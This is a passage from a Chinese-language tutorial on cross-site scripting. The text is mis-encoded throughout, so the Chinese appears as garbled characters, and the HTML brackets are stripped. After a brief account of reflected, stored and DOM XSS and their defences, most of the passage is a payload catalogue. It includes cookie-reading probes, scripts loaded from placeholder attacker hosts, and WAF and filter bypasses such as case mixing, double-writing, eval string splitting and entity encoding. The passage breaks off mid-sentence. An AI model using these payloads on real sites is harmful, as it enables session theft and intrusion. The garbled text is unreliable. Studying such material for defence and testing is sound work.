ä»URLå–å‡ºï¼Œæ‹¼æ¥åœ¨HTMLè¿”å›ç»™æµè§ˆå™¨.3.ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿä¼šè¢«æ‰§è¡Œã€‚4.æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ é˜²å¾¡åå°„å‹æ”»å‡» 1.å¯¹è¾“å…¥æ£€æŸ¥å¯¹è¯·æ±‚å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œä¸€æ—¦å‘ç°å¯ç–‘çš„ç‰¹æ®Šå­—ç¬¦å°±æ‹’ç»è¯·æ±‚ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ç”¨æˆ·å¯ä»¥ç»•è¿‡æµè§ˆå™¨çš„æ£€æŸ¥ï¼Œç›´æ¥é€šè¿‡Postmanç­‰å·¥å…·è¿›è¡Œè¯·æ±‚ï¼Œæ‰€ä»¥è¿™ä¸ªæ£€æŸ¥æœ€å¥½å‰åç«¯éƒ½åšã€‚2.å¯¹è¾“å‡ºè¿›è¡Œè½¬ä¹‰å†æ˜¾ç¤ºé€šè¿‡ä¸Šé¢çš„ä»‹ç»å¯ä»¥çœ‹å‡ºï¼Œåå°„å‹XSSæ”»å‡»è¦è¿›è¡Œæ”»å‡»çš„è¯éœ€è¦åœ¨å‰ç«¯é¡µé¢è¿›è¡Œæ˜¾ç¤ºã€‚æ‰€ä»¥åœ¨è¾“å‡ºæ•°æ®ä¹‹å‰å¯¹æ½œåœ¨çš„å¨èƒçš„å­—ç¬¦è¿›è¡Œç¼–ç ã€è½¬ä¹‰ä¹Ÿæ˜¯é˜²å¾¡XSSæ”»å‡»ååˆ†æœ‰æ•ˆçš„æªæ–½ã€‚ å­˜å‚¨å‹xss æ”»å‡»æ–¹å¼ æ”»å‡»è€…åœ¨å‘å¸–ã€ç•™è¨€ã€è¯„è®ºçš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸ä¿¡æ¯ä¸€èµ·æ³¨å…¥åˆ°å‘å¸ƒå†…å®¹ä¸­ã€‚éšç€å‘å¸ƒå†…å®¹è¢«æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿå°†æ°¸ä¹…çš„å­˜æ”¾åˆ°æœåŠ¡å™¨çš„åç«¯å­˜å‚¨å™¨ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº†æ¶æ„è„šæœ¬çš„å¸–å­æ—¶ï¼Œæ¶æ„è„šæœ¬å°±ä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­å¾—åˆ°æ‰§è¡Œã€‚ æ”»å‡»æ­¥éª¤ 1.æ”»å‡»è€…å°†æ¶æ„ä»£ç æäº¤åˆ°ç›®æ ‡ç½‘ç«™çš„æ•°æ®åº“ä¸­ã€‚2.ç”¨æˆ·æ‰“å¼€ç›®æ ‡ç½‘ç«™æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä»æ•°æ®åº“ä¸­å–å‡ºï¼Œæ‹¼æ¥åœ¨HTMLä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚3.ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚4.æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–å†’å……ç”¨æˆ·è¡Œä¸ºï¼Œå‡‹ç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œ.è¿™ç§æ”»å‡»å¸¸è§äºå¸¦æœ‰ç”¨æˆ·ä¿å­˜æ•°æ®çš„ç½‘ç«™åŠŸèƒ½ï¼Œå¦‚è®ºå›å‘å¸–ï¼Œå•†å“è¯„è®ºï¼Œç”¨æˆ·ç§ä¿¡ç­‰ã€‚ é¢„é˜²å­˜å‚¨å‹XSSæ”»å‡» é¢„é˜²å­˜å‚¨å‹XSSæ”»å‡»ä¹Ÿæ˜¯ä»è¾“å…¥å’Œè¾“å‡ºä¸¤ä¸ªæ–¹é¢æ¥è€ƒè™‘ã€‚1.æœåŠ¡å™¨æ¥æ”¶åˆ°æ•°æ®ï¼Œåœ¨å­˜å‚¨åˆ°æ•°æ®åº“ä¹‹å‰ï¼Œè¿›è¡Œè½¬ä¹‰å’Œè¿‡æ»¤å±é™©å­—ç¬¦;2.å‰ç«¯æ¥æ”¶åˆ°æœåŠ¡å™¨ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼Œåœ¨å±•ç¤ºåˆ°é¡µé¢å‰ï¼Œå…ˆè¿›è¡Œè½¬ä¹‰/è¿‡æ»¤;ä¸è®ºæ˜¯åå°„å‹æ”»å‡»è¿˜æ˜¯å­˜å‚¨å‹ï¼Œæ”»å‡»è€…æ€»éœ€è¦æ‰¾åˆ°ä¸¤ä¸ªè¦ç‚¹ï¼Œå³â€œè¾“å…¥ç‚¹â€ä¸è¾“å‡ºç‚¹ï¼Œä¹Ÿåªæœ‰è¿™ä¸¤è€…éƒ½æ»¡è¶³ï¼ŒXSSæ”»å‡»æ‰ä¼šç”Ÿæ•ˆã€‚â€œè¾“å…¥ç‚¹â€ç”¨äºå‘ webé¡µé¢æ³¨å…¥æ‰€éœ€çš„æ”»å‡»ä»£ç ï¼Œè€Œâ€œè¾“å‡ºç‚¹â€å°±æ˜¯æ”»å‡»ä»£ç è¢«æ‰§è¡Œçš„åœ°æ–¹ã€‚ DOMå‹xss æ”»å‡»æ–¹å¼ ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªç»è¿‡ä¸“é—¨è®¾è®¡çš„URLï¼Œå®ƒç”±æ”»å‡»è€…æä¾›ï¼Œè€Œä¸”å…¶ä¸­åŒ…å«XSSä»£ç ã€‚æœåŠ¡å™¨çš„å“åº”ä¸ä¼šä»¥ä»»ä½•å½¢å¼åŒ…å«æ”»å‡»è€…çš„è„šæœ¬ï¼Œå½“ç”¨æˆ·çš„æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOMå¯¹è±¡å°±ä¼šå¤„ç†XSSä»£ç ï¼Œå¯¼è‡´å­˜åœ¨XSSæ¼æ´ã€‚/*DOM(Document object model)ï¼Œä½¿ç”¨DOMèƒ½å¤Ÿä½¿ç¨‹åºå’Œè„šæœ¬èƒ½å¤ŸåŠ¨æ€è®¿é—®å’Œæ›´æ–°æ–‡æ¡£çš„å†…å®¹ã€ç»“æ„å’Œæ ·å¼ã€‚DOMå‹XSSå…¶å®æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„åå°„å‹XSSï¼Œå®ƒæ˜¯åŸºäºDOMæ–‡æ¡£å¯¹è±¡çš„ä¸€ç§æ¼æ´ã€‚DOMå‹XSSæ˜¯åŸºäºjsä¸Šçš„ï¼Œä¸éœ€è¦ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚*/ æ”»å‡»æ­¥éª¤ 1.æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šæ•°æ®ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚2.ç”¨æˆ·æµè§ˆå™¨æ‰§è¡Œäº†æ¶æ„ä»£ç 3.æ¶æ„çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–å†’å……ç”¨æˆ·è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œ./*DOMå‹XSSæ”»å‡»ä¸­ï¼Œå–å‡ºå’Œæ‰§è¡Œæ¶æ„ä»£ç ç”±æµè§ˆå™¨ç«¯å®Œæˆï¼Œå±äºå‰ç«¯javascriptè‡ªèº«çš„å®‰å…¨æ¼æ´.*/ å…¶ä»–é˜²èŒƒç­–ç•¥ HTTP-only Cookie:ç¦æ­¢JavaScriptè¯»å–æŸäº›æ•æ„ŸCookieï¼Œæ”»å‡»è€…å®ŒæˆXSSæ³¨å…¥åä¹Ÿæ— æ³•çªƒå–æ­¤Cookieå±æ€§ï¼šé˜²æ­¢è„šæœ¬å†’å……ç”¨æˆ·æäº¤å±é™©æ“ä½œ åœ¨æœåŠ¡ç«¯ä½¿ç”¨HTTPçš„Content-Security-Policyå¤´éƒ¨æ¥æŒ‡å®šç­–ç•¥ï¼Œæˆ–è€…åœ¨å‰ç«¯è®¾ç½®metaæ ‡ç­”ã€‚ä¾‹å¦‚åªå…è®¸åŠ è½½åŒåŸŸä¸‹çš„èµ„æº åº”å¯¹XSSæ”»å‡»çš„ä¸»è¦æ‰‹æ®µè¿˜æ˜¯ç¼–ç ä¸è¿‡æ»¤ä¸¤ç§ï¼Œç¼–ç ç”¨äºå°†ç‰¹æ®Šçš„ç¬¦å· â€œã€ã€ã€â€™ã€â€â€è¿›è¡Œhtmlè½¬ä¹‰ï¼Œè€Œè¿‡æ»¤åˆ™æ˜¯é˜»æ­¢ç‰¹å®šçš„æ ‡è®°ã€å±æ€§ã€äº‹ä»¶ã€‚ äºŒã€æ”»å‡»è·è½½alert font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);prompt/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);prompt(1)/font ä¼šå¼¹è¾“å…¥æ¡†ï¼Œç‚¹ç¡®å®šå³ç®—æ‰§è¡Œ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);confirm/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);confirm(1)/font å¼¹ç¡®å®šå–æ¶ˆæ¡† font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);open/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);open(javascript:alert(1))/font æ—¢å¼¹çª—åˆèƒ½åŠ è½½ä¼ªåè®® font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);print/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);print()/font è°ƒå‡ºæ‰“å°å¯¹è¯æ¡†ï¼ˆéƒ¨åˆ†æµè§ˆå™¨ï¼‰ scriptæ ‡ç­¾script æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬scriptalert(xss)/script scriptalert(/xss/)/script scriptalert(document.cookie)/script script src=http://xxx.com/xss.js/script svgæ ‡ç­¾svg æ ‡ç­¾ç”¨æ¥åœ¨HTMLé¡µé¢ä¸­ç›´æ¥åµŒå…¥SVG æ–‡ä»¶çš„ä»£ç ã€‚ // ç­‰ä»·äº svg onload=alert(xss)svg onload=alert(xss)// imgæ ‡ç­¾img æ ‡ç­¾å®šä¹‰ HTML é¡µé¢ä¸­çš„å›¾åƒimg src=1 onerror=alert(xss)img src=1 onerror=alert(document.cookie)img src=1 onerror=eval(alert(xss))img src=javascript:alert(xss)img src=javascript:alert(String.formCharCode(88,83,83))img src=1 onmouseover=alert(xss) bodyæ ‡ç­¾body æ ‡ç­¾å®šä¹‰æ–‡æ¡£çš„ä¸»ä½“ã€‚body onload=alert(xss)body onpageshow=alert(xss) videoæ ‡ç­¾video æ ‡ç­¾å®šä¹‰è§†é¢‘ï¼Œæ¯”å¦‚ç”µå½±ç‰‡æ®µæˆ–å…¶ä»–è§†é¢‘æµã€‚videosource onerror=alert(1)videosource onerror=alert(xss);/videovideo controls onmouseover=alert(xss);/videovideo controls onfocus=alert(xss); autofocus=/videovideo controls onclick=alert(xss);/video styleæ ‡ç­¾style æ ‡ç­¾å®šä¹‰ HTML æ–‡æ¡£çš„æ ·å¼ä¿¡æ¯ã€‚style onload=alert(1)/style inputæ ‡ç­¾inputæ ‡ç­¾è§„å®šäº†ç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­è¾“å…¥æ•°æ®çš„è¾“å…¥å­—æ®µã€‚ç‚¹å‡»è¾“å…¥æ¡†è§¦å‘input onfocus=alert(1);input value= onclick=alert(xss) type=textinput name=name value=onmouseover=prompt(xss) bad=input name=name value=scriptalert(xss)/scriptinput onblur=alert(1) autofocusinput autofocusinput onfocus=alert(1); autofocus details æ ‡ç­¾details æ ‡ç­¾é€šè¿‡æä¾›ç”¨æˆ·å¼€å¯å…³é—­çš„äº¤äº’å¼æ§ä»¶ï¼Œè§„å®šäº†ç”¨æˆ·å¯è§çš„æˆ–è€…éšè—çš„éœ€æ±‚çš„è¡¥å……ç»†èŠ‚ã€‚details ontoggle=alert(1);details open ontoggle=alert(1); select æ ‡ç­¾select æ ‡ç­¾ç”¨æ¥åˆ›å»ºä¸‹æ‹‰åˆ—è¡¨ã€‚select onfocus=alert(1)/selectselect onfocus=alert(1) autofocus iframe æ ‡ç­¾iframe æ ‡ç­¾ä¼šåˆ›å»ºåŒ…å«å¦å¤–ä¸€ä¸ªæ–‡æ¡£çš„å†…è”æ¡†æ¶ iframe onload=alert(1);/iframe audio æ ‡ç­¾audio æ ‡ç­¾å®šä¹‰å£°éŸ³ï¼Œæ¯”å¦‚éŸ³ä¹æˆ–å…¶ä»–éŸ³é¢‘æµã€‚audio src=x onerror=alert(1); textarea æ ‡ç­¾`textarea` æ ‡ç­¾å®šä¹‰ä¸€ä¸ªå¤šè¡Œçš„æ–‡æœ¬è¾“å…¥æ§ä»¶ã€‚textarea onfocus=alert(1); autofocus marquee æ ‡ç­¾marquee onstart=alert(1)/marquee //Chromeä¸è¡Œï¼Œç«ç‹å’ŒIEéƒ½å¯ä»¥ isindex æ ‡ç­¾isindex type=image src=1 onerror=alert(1)//ä»…é™äºIE link æ ‡ç­¾link æ ‡ç­¾å®šä¹‰æ–‡æ¡£ä¸å¤–éƒ¨èµ„æºçš„å…³ç³»ã€‚åœ¨æ— CSPçš„æƒ…å†µä¸‹æ‰å¯ä»¥ä½¿ç”¨ï¼š link rel=import href=http://47.xxx.xxx.72/evil.js a æ ‡ç­¾a href=javascript:alert(1);xss/aa href=x onclick=eval(alert(xss);)xss/aa href=x onmouseover=alert(xss);xss/aa href=x onmouseout=alert(xss);xss/a formæ ‡ç­¾form action=Javascript:alert(1)input type=submitform method=x action=x onmouseover=alert(xss);input type=submit/form buttonæ ‡ç­¾button onclick=alert(1)button onfocus=alert(xss); autofocus=xss/buttonbutton onclick=alert(xss);xss/buttonbutton onmouseover=alert(xss);xss/buttonbutton onmouseout=alert(xss);xss/buttonbutton onmouseup=alert(xss);xss/buttonbutton onmousedown=alert(xss);/button divæ ‡ç­¾è¿™ä¸ªéœ€è¦å€ŸåŠ©urlç¼–ç æ¥å®ç°ç»•è¿‡åŸä»£ç ï¼šdiv onmouseover=alert(1)DIV/divç»è¿‡urlç¼–ç ï¼šdiv onmouseover%3dalert%26lpar%3b1%26rpar%3bDIV%2fdiv objectæ ‡ç­¾è¿™ä¸ªéœ€è¦å€ŸåŠ© data ä¼ªåè®®å’Œ base64 ç¼–ç æ¥å®ç°ç»•è¿‡object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=/object pæ ‡ç­¾p onclick=alert(xss);xss/pp onmouseover=alert(xss);xss/pp onmouseout=alert(xss);xss/pp onmouseup=alert(xss);xss/p ä¸‰ã€ç»•è¿‡æ€è·¯è¿‡æ»¤ å±é™©å­—ç¬¦ â€œ â€˜ ç»•è¿‡ç©ºæ ¼è¿‡æ»¤å½“ç©ºæ ¼è¢«è¿‡æ»¤äº†æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ / æ¥ä»£æ›¿ç©ºæ ¼ï¼š img/src=x/onerror=alert(1); ç©ºæ ¼å›è½¦Tabç»•è¿‡ä¸»è¦å’Œæ­£åˆ™å¯¹æŠ—ç©ºæ ¼ï¼šimg src= javascript:alert(9527); TABï¼š img src= javasc :ript:alert(9528); å›è½¦ï¼š img src= javascript:alert(xss); ç»•è¿‡å¼•å·è¿‡æ»¤å¦‚æœæ˜¯htmlæ ‡ç­¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨å¼•å·ã€‚å¦‚æœæ˜¯åœ¨jsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·ï¼š img src=x onerror=alert(`xss`); ç»•è¿‡æ‹¬å·è¿‡æ»¤å½“æ‹¬å·è¢«è¿‡æ»¤çš„æ—¶å€™å¯ä»¥ä½¿ç”¨throwæ¥ç»•è¿‡ã€‚throw è¯­å¥ç”¨äºå½“é”™è¯¯å‘ç”Ÿæ—¶æŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚ img src=x onerror=javascript:window.onerror=alert;throw 1a onmouseover=javascript:window.onerror=alert;throw 1 ç»•è¿‡å…³é”®å­—è¿‡æ»¤å¤§å°å†™ç»•è¿‡sCRiPtalert(1);/sCrIpTImG sRc=x onerRor=alert(1); åŒå†™ç»•è¿‡æœ‰äº›wafå¯èƒ½ä¼šåªæ›¿æ¢ä¸€æ¬¡ä¸”æ˜¯æ›¿æ¢ä¸ºç©ºï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è€ƒè™‘åŒå†™å…³é”®å­—ç»•è¿‡ scrscriptiptalert(1);/scrscriptiptimimgg srsrcc=x onerror=alert(1); å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡åˆ©ç”¨eval()å‡½æ•° ä¸PHPçš„eval()å‡½æ•°ç›¸åŒï¼ŒJavaScriptçš„eval()å‡½æ•°ä¹Ÿå¯ä»¥è®¡ç®— JavaScript å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œã€‚ img src=x onerror=a=aler;b=t;c=(1);eval(a+b+c)img src=x onerror=a=`aler`;b=`t`;c=(`xss`);;eval(a+b+c)!--åœ¨jsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·-- åˆ©ç”¨top scripttop[al+ert](`xss`);/scriptscripttop[al+ert](xss);/script æ‹†åˆ†æ³•å½“ Web åº”ç”¨ç¨‹åºå¯¹ç›®æ ‡ç”¨æˆ·çš„è¾“å…¥é•¿åº¦è¿›è¡Œäº†é™åˆ¶æ—¶ï¼Œè¿™æ—¶æ— æ³•æ³¨å…¥è¾ƒé•¿çš„xssæ”»å‡»å‘é‡ï¼Œä½†æ˜¯ç‰¹å®šæƒ…å†µä¸‹ï¼Œè¿™ç§é™åˆ¶å¯ä»¥é€šè¿‡æ‹†åˆ†æ³•æ³¨å…¥çš„æ–¹å¼è¿›è¡Œç»•è¿‡ scripta=document.write(/scriptscripta=a+script src=ht/scriptscripta=a+tp://note163.com/xs/scriptscripta=a+s.js/script)/scriptscripteval(a)/script/*document.write(script src = http://note163.com/xss.js/script)*/ ä¸Šä¼ æ–‡ä»¶æ„é€ xssä¸Šä¼ æ™®é€šæ–‡ä»¶æ›´æ”¹æ–‡ä»¶åä¸ºxssè¯­å¥ .gifpng ç¼–ç ç»•è¿‡æµè§ˆå™¨æ•´ä¸ªè§£æé¡ºåºä¸º3ä¸ªç¯èŠ‚ï¼šHTMLå®ä½“è§£ç  â€”URLè§£ç  â€”JSè§£ç ï¼ˆåªæ”¯æŒUnicodeï¼‰ HTML å®ä½“ç¼–ç  æˆ‘ä»¬å¯ä»¥å°†DOMèŠ‚ç‚¹ä¸­çš„å†…å®¹è½¬åŒ–ä¸ºHTMLå®ä½“ï¼Œå› ä¸ºè§£æHTMLä¹‹åå»ºç«‹èµ·èŠ‚ç‚¹ï¼Œç„¶åä¼šå¯¹DOMèŠ‚ç‚¹é‡Œé¢çš„HTMLå®ä½“è¿›è¡Œè§£æã€‚HTML ç¼–ç ä¸»è¦åˆ†ä¸º10è¿›åˆ¶å’Œ16è¿›åˆ¶ï¼Œæ ¼å¼ä¸ºä»¥ # å¼€å¤´ä»¥åˆ†å· ; ç»“å°¾ï¼ˆä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·ï¼‰ã€‚ !--a href=javascript:alert(xss)test\\/a--!--åè¿›åˆ¶--a href=#106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#34;#120;#115;#115;#34;#41;test/a !--åå…­è¿›åˆ¶--a href=#x6A;#x61;#x76;#x61;#x73;#x63;#x72;#x69;#x70;#x74;#x3A;#x61;#x6C;#x65;#x72;#x74;#x28;#x22;#x78;#x73;#x73;#x22;#x29;test/a !--ä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·--a href=#x6A#x61#x76#x61#x73#x63#x72#x69#x70#x74#x3A#x61#x6C#x65#x72#x74#x28#x22#x78#x73#x73#x22#x29test/a!--img src=x onerror=alert(xss)--!--åè¿›åˆ¶--img src=x onerror=#97;#108;#101;#114;#116;#40;#34;#120;#115;#115;#34;#41; !--åå…­è¿›åˆ¶--img src=x onerror=#x61;#x6C;#x65;#x72;#x74;#x28;#x22;#x78;#x73;#x73;#x22;#x29; !--ä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·--img src=x onerror=#x61#x6C#x65#x72#x74#x28#x22#x78#x73#x73#x22#x29 HTMLå­—ç¬¦å®ä½“ï¼Œå¹¶ä¸æ˜¯è¯´ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å®ä½“ç¼–ç ï¼Œåªæœ‰å¤„äº â€œæ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ã€â€œå±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ å’Œ â€œRCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ è¿™ä¸‰ç§çŠ¶æ€ä¸­çš„HTMLå­—ç¬¦å®ä½“å°†ä¼šä» #â€¦ å½¢å¼è§£ç ï¼Œè½¬åŒ–æˆå¯¹åº”çš„è§£ç å­—ç¬¦å¹¶è¢«æ”¾å…¥æ•°æ®ç¼“å†²åŒºä¸­ã€‚ ä¸€ä¸ªHTMLè§£æå™¨ä½œä¸ºä¸€ä¸ªçŠ¶æ€æœºï¼Œå®ƒä»è¾“å…¥æµä¸­è·å–å­—ç¬¦å¹¶æŒ‰ç…§è½¬æ¢è§„åˆ™è½¬æ¢åˆ°å¦ä¸€ç§çŠ¶æ€ã€‚åœ¨è§£æè¿‡ç¨‹ä¸­ï¼Œä»»ä½•æ—¶å€™å®ƒåªè¦é‡åˆ°ä¸€ä¸ª ç¬¦å·ï¼ˆåé¢æ²¡æœ‰è·Ÿ ç¬¦å·ï¼‰å°±ä¼šè¿›å…¥ æ ‡ç­¾å¼€å§‹çŠ¶æ€(Tag open state) ï¼Œç„¶åè½¬å˜åˆ° æ ‡ç­¾åçŠ¶æ€(Tag name state) ã€ å‰å±æ€§åçŠ¶æ€(before attribute name state) â€¦â€¦æœ€åè¿›å…¥ æ•°æ®çŠ¶æ€(Data state) å¹¶é‡Šæ”¾å½“å‰æ ‡ç­¾çš„tokenã€‚å½“è§£æå™¨å¤„äºæ•°æ®çŠ¶æ€(Data state) æ—¶ï¼Œå®ƒä¼šç»§ç»­è§£æï¼Œæ¯å½“å‘ç°ä¸€ä¸ªå®Œæ•´çš„æ ‡ç­¾ï¼Œå°±ä¼šé‡Šæ”¾å‡ºä¸€ä¸ªtokenã€‚ ç®€å•çš„è¯´å°±æ˜¯ï¼Œæµè§ˆå™¨å¯¹HTMLè§£ç ä¹‹åå°±å¼€å§‹è§£æHTMLæ–‡æ¡£ï¼Œå°†ä¼—å¤šæ ‡ç­¾è½¬åŒ–ä¸ºå†…å®¹æ ‘ä¸­çš„DOMèŠ‚ç‚¹ï¼Œæ­¤æ—¶è¯†åˆ«æ ‡ç­¾çš„æ—¶å€™ï¼ŒHTMLè§£æå™¨æ˜¯æ— æ³•è¯†åˆ«é‚£äº›è¢«å®ä½“ç¼–ç çš„å†…å®¹çš„ï¼Œåªæœ‰å»ºç«‹èµ·DOMæ ‘ï¼Œæ‰èƒ½å¯¹æ¯ä¸ªèŠ‚ç‚¹çš„å†…å®¹è¿›è¡Œè¯†åˆ«ï¼Œå¦‚æœå‡ºç°å®ä½“ç¼–ç ï¼Œåˆ™ä¼šè¿›è¡Œå®ä½“è§£ç ï¼Œåªè¦æ˜¯DOMèŠ‚ç‚¹é‡Œå±æ€§çš„å€¼ï¼Œéƒ½å¯ä»¥è¢«HTMLç¼–ç å’Œè§£æã€‚ **æ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼š**æ•°æ®çŠ¶æ€å°±æ˜¯è§£æä¸€ä¸ªæ ‡ç­¾å†…é‡Œé¢çš„å†…å®¹ï¼Œå¦‚ div.../div ä¸­çš„å†…å®¹ï¼Œå½“æµè§ˆå™¨è§£æå®Œ div æ ‡ç­¾ä¹‹åå¦‚æœå‘ç°æ ‡ç­¾å†…è¿˜å«æœ‰å®ä½“å­—ç¬¦çš„è¯ï¼Œå°±ä¼šæœ‰ä¸€ä¸ªå®ä½“ç¼–ç è§£æäº† **å±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼š**å±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨å°±å¥½ç†è§£äº†ï¼Œå°±æ˜¯srcï¼Œherfè¿™æ ·çš„å±æ€§å€¼ä¸­çš„HTMLå®ä½“ï¼Œä»–ä¹Ÿæ˜¯ä¼šå…ˆè¿›è¡ŒHTMLè§£ç çš„ã€‚ RCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼šç„¶åå†æ¥çœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯RCDATAè½¬æ€ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹HTMLä¸­æœ‰äº”ç±»å…ƒç´ ï¼š ç©ºå…ƒç´ (Void elements)ï¼Œå¦‚ areaã€brã€base ç­‰ç­‰ã€‚ç©ºå…ƒç´ ä¸èƒ½å®¹çº³ä»»ä½•å†…å®¹ï¼Œå› ä¸ºå®ƒä»¬æ²¡æœ‰é—­åˆæ ‡ç­¾ï¼Œæ²¡æœ‰å†…å®¹èƒ½å¤Ÿæ”¾åœ¨å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾ä¸­é—´ã€‚ åŸå§‹æ–‡æœ¬å…ƒç´ (Raw text elements)ï¼Œæœ‰ script å’Œ styleã€‚åŸå§‹æ–‡æœ¬å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€‚ RCDATAå…ƒç´ (RCDATA elements)ï¼Œæœ‰ textarea å’Œ titleã€‚RCDATAå…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬å’Œå­—ç¬¦å¼•ç”¨ã€‚ å¤–éƒ¨å…ƒç´ (Foreign elements)ï¼Œä¾‹å¦‚MathMLå‘½åç©ºé—´æˆ–è€…SVGå‘½åç©ºé—´çš„å…ƒç´ ã€‚å¤–éƒ¨å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚ åŸºæœ¬å…ƒç´ (Normal elements)ï¼Œå³é™¤äº†ä»¥ä¸Š4ç§å…ƒç´ ä»¥å¤–çš„å…ƒç´ ã€‚åŸºæœ¬å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚ æ³¨æ„åˆ°RCDATAå…ƒç´ ä¸­æœ‰ textarea å’Œ title ä¸¤ä¸ªå±æ€§å¹¶ä¸”æœ‰å­—ç¬¦å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯å½“å®ä½“å­—ç¬¦å‡ºç°åœ¨è¿™ä¸¤ä¸ªæ ‡ç­¾é‡Œé¢çš„æ—¶å€™ï¼Œå®ä½“å­—ç¬¦ä¼šè¢«è¯†åˆ«å¹¶è¿›è¡ŒHTMLç¼–ç è§£æã€‚è¿™é‡Œè¦å†æé†’ä¸€æ¬¡ï¼Œåœ¨è§£æè¿™äº›å­—ç¬¦å¼•ç”¨çš„è¿‡ç¨‹ä¸­ä¸ä¼šè¿›å…¥â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ï¼Œæ‰€ä»¥å°±ä¸ä¼šå»ºç«‹æ–°çš„æ ‡ç­¾ï¼Œæ‰€ä»¥HTMLç¼–ç çš„XSSè¯­å¥è§¦å‘ä¸äº†XSSã€‚ HTMLçš„äº”ç±»å…ƒç´ ä¸­ï¼Œåƒ 